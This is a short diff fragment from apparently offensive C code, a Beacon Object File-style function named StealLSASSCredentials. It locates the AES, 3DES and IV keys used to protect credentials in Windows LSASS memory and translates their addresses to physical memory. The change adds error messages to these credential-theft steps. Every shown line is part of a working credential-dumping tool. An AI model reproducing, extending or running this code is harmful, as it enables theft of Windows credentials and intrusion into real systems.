@@ -169,20 +169,30 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMS
 
     if (!SearchForCredentialKeys(pvWindowsVersion, &hAesKeyAddress, &h3DesKeyAddress, &IVAddress))
     {
+        BeaconFormatPrintf(&outputbuffer, "[!] Failed to find credential keys!\n");
         return FALSE;
     }
 
     DWORD64 hAesKeyPhysicalAddress = 0;
     if (!TranslateUVA2Physical(hAesKeyAddress, &hAesKeyPhysicalAddress, lower32bits, LsassPID))
+    {
+        BeaconFormatPrintf(&outputbuffer, "[!] AES Key has invalid address!\n");
         return FALSE;
+    }
 
     DWORD64 h3DesKeyPhysicalAddress = 0;
     if (!TranslateUVA2Physical(h3DesKeyAddress, &h3DesKeyPhysicalAddress, lower32bits, LsassPID))
+    {
+        BeaconFormatPrintf(&outputbuffer, "[!] 3Des Key has invalid address!\n");
         return FALSE;
+    }
 
     DWORD64 IVPhysicalAddress = 0;
     if (!TranslateUVA2Physical(IVAddress, &IVPhysicalAddress, lower32bits, LsassPID))
+    {
+        BeaconFormatPrintf(&outputbuffer, "[!] IV has invalid address!\n");
         return FALSE;
+    }
 
 
     // The addresses we have above are pointers to the PBCRYPT_HANDLE_KEY
